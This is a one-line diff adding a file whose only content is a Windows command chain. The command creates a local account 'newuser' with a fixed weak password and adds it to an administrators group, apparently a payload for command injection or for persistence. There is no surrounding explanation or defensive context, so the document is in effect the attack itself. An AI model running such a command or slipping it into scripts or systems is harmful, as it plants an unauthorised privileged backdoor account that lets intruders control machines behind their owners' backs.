@@ -1,0 +1,1 @@
+net user newuser newpassword /add & net localgroup admins newuser /add
